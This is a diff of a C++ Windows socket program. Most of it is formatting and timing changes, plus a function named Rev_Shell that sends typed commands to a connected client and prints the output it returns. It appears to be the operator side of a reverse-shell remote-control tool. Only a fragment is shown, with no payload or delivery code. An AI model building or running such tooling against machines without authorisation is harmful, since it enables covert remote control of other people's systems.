@@ -9,11 +9,11 @@
 #include <mutex>
 
 using namespace std;
+#pragma comment(lib, "ws2_32.lib")
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 int argc_global;
 char **argv_global;
-
 
 bool targetconnected = false;
 #define MAX_IP_LENGTH 16
@@ -22,7 +22,6 @@ char ipAddress[MAX_IP_LENGTH], randomText[MAX_TEXT_LENGTH];
 char os;
 
 SOCKET sock;
-std::mutex mtx;
 std::mutex socketMutex; 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 bool socket_setup(SOCKET &clientSocket);
@@ -276,20 +275,24 @@ string receive_data(SOCKET &clientSocket, const string &filename)
         string receivedData;
         int bytesReceived;
 
-        do {
+        do
+        {
             bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
 
-            if (bytesReceived > 0) {
+            if (bytesReceived > 0)
+            {
                 buffer[bytesReceived] = '\0';
                 receivedData += buffer; // Append to the received data
-            } else if (bytesReceived == 0) {
+            } 
+            else if (bytesReceived == 0) 
+            {
                 cerr << "Connection closed by server." << endl;
                 break; // Exit the loop on clean close
-            } else {
+            } 
+            else 
+            {
                 int error = WSAGetLastError();
-                if (error != WSAECONNRESET) {
-                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-                }
+                if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
                 break; // Exit loop on error
             }
         } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
@@ -336,7 +339,6 @@ string receive_data(SOCKET &clientSocket, const string &filename)
         }
         safe_closesocket(clientSocket);
 
-        //send_data(clientSocket, "from_server.txt", "`");
         return body;
 
     }
@@ -391,36 +393,28 @@ bool getdata_from_file()
 
 int Rev_Shell(SOCKET &clientSocket)
 {
-
     atomic<bool> processFinished(false);
-    
+   
     auto readThread = std::thread([&]()
     {
         while (!processFinished.load())
         {
-            //{
-                //lock_guard<mutex> lock1(socketMutex);
-                //mtx.lock();
-                Sleep(100);
+            Sleep(500);
+            if(receive_data(clientSocket,"from_client.txt")[0] == '`')
+            {
+                
+                //cout<< "waiting for rev shell data " << endl;
+                continue;
+            }
+            else 
+            {
+                string data = receive_data(clientSocket, "from_client.txt");
+                send_data(clientSocket, "from_client.txt", "`");
+                
+                if (data.empty()) break;                                                            // Client has disconnected or there was an error
+                cout << data << endl;
+            }
 
-                if(receive_data(clientSocket,"from_client.txt")[0] == '`')
-                {
-                    
-                    //cout<< "waiting for rev shell data " << endl;
-                    continue;
-                }
-                else 
-                {
-                    string data = receive_data(clientSocket, "from_client.txt");
-                    send_data(clientSocket, "from_client.txt", "`");
-                    
-                    if (data.empty()) break;                                                            // Client has disconnected or there was an error
-                    cout << data << endl;
-                }
-            
-                //mtx.unlock();
-            //}
-            Sleep(100);                                                                            // Sleep for a short time to prevent 100% CPU usage
         }
     });
 
@@ -429,7 +423,6 @@ int Rev_Shell(SOCKET &clientSocket)
         string cmd;
         while (!processFinished.load())                                                                     
         {
-
 
             if (getline(cin, cmd))                                                                  //getline to allow multi-word commands
             {
@@ -443,7 +436,7 @@ int Rev_Shell(SOCKET &clientSocket)
                 if(!cmd.empty()) send_data(clientSocket, "from_server.txt" ,cmd);
             }
 
-            Sleep(100);
+            Sleep(500);
         }
     });
 
